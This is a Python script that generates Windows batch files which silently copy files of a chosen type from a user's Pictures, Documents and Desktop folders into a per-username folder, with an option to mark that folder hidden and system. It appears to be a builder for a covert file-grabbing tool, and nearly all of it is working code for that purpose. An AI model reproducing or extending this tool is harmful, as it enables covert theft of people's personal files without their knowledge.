import os
from MyScripts import ToDraw
def CrearArchivo():
    ruta=input("indicates the route, if it does not indicate the route, the route will be the projects folder >> ")
    if ruta=="": ruta="Projects\\"
    if os.path.isdir(ruta):
        nombreC = input("indicates the name of the folder>> ")
        nombreC=nombreC+"\\"
        os.mkdir(ruta+nombreC)
        name= input("indicates the name of the file .bat>> ")
        Archivo=open(ruta+nombreC+name+'.bat','w')
        Archivo.write("@echo off \n")
        Archivo.close()
        rutafull= ruta+nombreC+name
        return(rutafull)


def BuscarArchivos():
    os.system('cls')
    ToDraw.dibujo()
    print (chr(27)+"[1;37m"+"select the repository to find the data you want to copy \n")
    print("1 Pictures \n2 Documents \n3 Desktop \n4 all")
    op = input("enter the number >> ")
    return (op)


def CrearCodigoBat(rutafull,archivo,extencion,inicio,final):
    Archivo = open(rutafull + '.bat', 'a')
    if inicio==True:
        Archivo.write('IF NOT EXIST ".\information/"%USERNAME% MD ".\information/"%USERNAME% \n')

    if inicio == True or final == True:
        Archivo.write('IF NOT EXIST ".\information/"%USERNAME%\_'+archivo+' MD ".\information/"%USERNAME%\_'+archivo+'\n')

    if inicio == True:
        oculto=input("Hide folder that create the .Bat? y/n >> ").lower()
        if oculto=='y': Archivo.write('attrib +s +h ".\information" \n')
    else:
        oculto='n'

    if oculto=='y' or oculto=='n':
        if inicio == True:
            Archivo.write('cd ".\information/"%USERNAME%"\_' + archivo + '"\n')
        else:
            Archivo.write('cd ".." \n'+'cd "'+archivo+'" \n')
        A=BuscarArchivos()
        if A=='1':
            Archivo.write('for /R %USERPROFILE%\Pictures\ %%x in ('+extencion+') do copy "%%x" "./" \n')
        elif A=='2':
            Archivo.write('for /R %USERPROFILE%\Documents\ %%x in (' + extencion + ') do copy "%%x" "./" \n')
        elif A=='3':
             Archivo.write('for /R %USERPROFILE%\Desktop\ %%x in (' + extencion + ') do copy "%%x" "./" \n')
        elif A=='4':
            Archivo.write('for /R %USERPROFILE%\Pictures\ %%x in (' + extencion + ') do copy "%%x" "./" \n')
            Archivo.write('for /R %USERPROFILE%\Documents\ %%x in (' + extencion + ') do copy "%%x" "./" \n')
            Archivo.write('for /R %USERPROFILE%\Desktop\ %%x in (' + extencion + ') do copy "%%x" "./" \n')
        else:
            print ("please select an option of 1 to 4...")
            BuscarArchivos()
        if final==True:
            Archivo.write("EXIT \n EXIT")
            salir = input("File created in the address " + rutafull + " Press a key to go to the menu")
            Archivo.close()













